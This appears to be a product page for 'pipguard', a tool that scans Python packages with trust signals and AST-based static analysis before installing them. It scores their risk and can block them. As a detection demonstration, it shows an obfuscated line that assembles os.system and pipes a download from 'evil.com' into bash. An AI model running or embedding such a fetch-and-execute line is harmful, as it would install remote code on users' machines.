How it works

Two layers. Zero execution.

01
Layer 1 — No download required
Trust signals
  • Package age and version history
  • Download spike detection
  • Known CVEs via OSV.dev
  • GitHub repo presence and activity
  • Maintainer account signals
02
Layer 2 — AST-based, no code runs
Static analysis
  • Downloads source tarball only
  • Parses setup.py and __init__.py via AST
  • Detects network calls and env var access
  • Catches shell execution and home dir access
  • Flags base64 obfuscation patterns
Why AST over grep

Obfuscation doesn't hide from a parser.

String matching misses clever obfuscation. pipguard uses Python's AST parser to analyze the actual structure of the code — not just its surface text.

GREP MISSES THIS
# no obvious keywords
getattr(os, 'sys'+'tem')('curl evil.com | bash')
AST CATCHES IT
# AST sees: getattr call on os module
# string concatenation forming 'system'
# shell string passed as argument
→ shell_execution: TRUE
Risk scoring

Three outcomes. One decision.

0–30
Low Risk
Installs automatically. Signals look clean, no intervention needed.
31–60
Medium Risk
Asks for confirmation before proceeding. Your call.
61+
High Risk
Blocked. Requires explicit override with --force to proceed.
